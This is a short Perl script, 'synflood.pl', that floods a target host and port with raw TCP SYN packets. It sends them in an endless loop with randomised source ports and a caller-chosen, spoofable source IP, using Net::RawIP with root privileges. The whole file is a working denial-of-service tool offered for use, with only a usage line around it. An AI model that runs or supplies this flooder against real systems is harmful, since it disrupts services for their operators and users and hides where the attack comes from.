#!/usr/bin/env perl
# synflood.pl - Simple SYN Flooder
# Author: iphelix
#
# Requires perl, Net::RawIP module, and root privileges
# p5-net-rawip @0.2 (perl)
#    Perl module to manipulate raw IP packets.

use Net::RawIP;

if($#ARGV == 2)
{
   ($src,$dst,$port) = @ARGV;
   $a = new Net::RawIP;
   while(1) {
      $src_port = rand(65534)+1;
      $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
      $a->send;   
   }
}
else
{
   print "sudo $0 source_ip destination_ip destination_port\n";
   print "eg. sudo perl $0 192.168.1.193 192.168.1.1 80\n";
}
